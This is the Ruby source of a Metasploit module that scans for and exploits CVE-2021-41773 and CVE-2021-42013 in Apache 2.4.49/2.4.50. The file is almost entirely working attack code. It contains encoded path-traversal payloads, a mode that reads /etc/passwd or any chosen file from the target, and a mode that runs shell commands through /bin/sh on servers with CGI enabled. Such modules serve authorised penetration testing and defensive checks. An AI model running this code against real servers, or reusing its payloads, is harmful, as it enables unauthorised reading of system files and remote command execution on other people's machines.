##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE scanner',
        'Description' => %q{
          This module scan for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
          If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
          it can be used to execute arbitrary commands (Remote Command Execution).
          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).
        },
        'References' => [
          ['CVE', '2021-41773'],
          ['CVE', '2021-42013'],
          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse'],
          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml'],
          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74'],
          ['URL', 'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis']
        ],
        'Author' => [
          'Ash Daulton', # Vulnerability discovery
          'Dhiraj Mishra', # Metasploit auxiliary module
          'mekhalleh (RAMELLA Sébastien)' # Metasploit exploit module (Zeop Entreprise)
        ],
        'DisclosureDate' => '2021-05-10',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        },
        'Actions' => [
          [
            'Apache 2.4.49',
            {
              'Description' => 'Payload for Apache 2.4.49',
              'CVE' => 'CVE-2021-41773',
              'Payload' => '.%2e/'
            }
          ],
          [
            'Apache 2.4.49 and 2.4.50',
            {
              'Description' => 'Payload for Apache 2.4.49 and 2.4.50',
              'CVE' => 'CVE-2021-42013',
              'Payload' => '.%%32%65/'
            }
          ]
        ],
        'DefaultAction' => 'Apache 2.4.49 and 2.4.50'
      )
    )

    register_options([
      OptEnum.new('StartMode', [true, 'Start mode.', 'Traversal', [ 'Traversal', 'RCE', 'Read']]),
      OptString.new('FILEPATH', [false, 'File you want to read', '/etc/passwd']),
      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5])
    ])
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def exec_traversal(cmd)
    send_request_raw({
      'method' => Rex::Text.rand_text_alpha(3..4),
      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),
      'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}"
    })
  end

  def read_traversal
    send_request_raw({
      'method' => 'GET',
      'uri' => normalize_uri(@target_uri, @traversal.to_s)
    })
  end

  def run_host(ip)
    @proto = (ssl ? 'https' : 'http')

    case datastore['StartMode']
    when /Traversal/
      @target_uri = Rex::Text.rand_text_alpha(4..8)
      @traversal = action['Payload'] * datastore['DEPTH'] << '/etc/passwd'

      response = read_traversal
      unless response
        print_error(message('No response, target seems down.'))

        return Exploit::CheckCode::Unknown
      end

      if response.code != 403
        print_error(message("The target is not vulnerable to #{action['CVE']}."))

        return Exploit::CheckCode::Safe
      end
      print_good(message("The target is vulnerable to #{action['CVE']}."))

      vprint_status("Obtained HTTP response code #{response.code}.")
      report_vuln(
        host: target_host,
        name: name,
        refs: references
      )

      return Exploit::CheckCode::Vulnerable
    when /RCE/
      @traversal = action['Payload'] * datastore['DEPTH'] << '/bin/sh'
      rand_str = Rex::Text.rand_text_alpha(4..8)

      response = exec_traversal("echo #{rand_str}")
      unless response
        print_error(message('No response, target seems down.'))

        return Exploit::CheckCode::Unknown
      end

      if response.code == 200 && response.body.include?(rand_str)
        print_good(message("The target is vulnerable to #{action['CVE']} (mod_cgi enabled)."))
        report_vuln(
          host: target_host,
          name: name,
          refs: references
        )

        return Exploit::CheckCode::Vulnerable
      end
      print_error(message("The target is not vulnerable to #{action['CVE']} (mod_cgi enabled)."))

      return Exploit::CheckCode::Safe
    when /Read/
      fail_with(Failure::BadConfig, 'File path option is empty!') if !datastore['FILEPATH'] || datastore['FILEPATH'].empty?

      @target_uri = datastore['TARGETURI']
      @traversal = action['Payload'] * datastore['DEPTH'] << datastore['FILEPATH']

      response = read_traversal
      unless response
        print_error(message('No response, target seems down.'))

        return
      end

      if response.code == 500
        print_warning(message("The target is vulnerable to #{action['CVE']} (mod_cgi enabled)."))
      end

      if response.code == 500 || response.body.empty?
        print_error('Nothing was downloaded')

        return
      end

      if response.code == 200
        vprint_good("#{peer} \n#{response.body}")
        path = store_loot(
          'apache.traversal',
          'application/octet-stream',
          ip,
          response.body,
          datastore['FILEPATH']
        )
        print_good("File saved in: #{path}")
      end
    end
  end
end
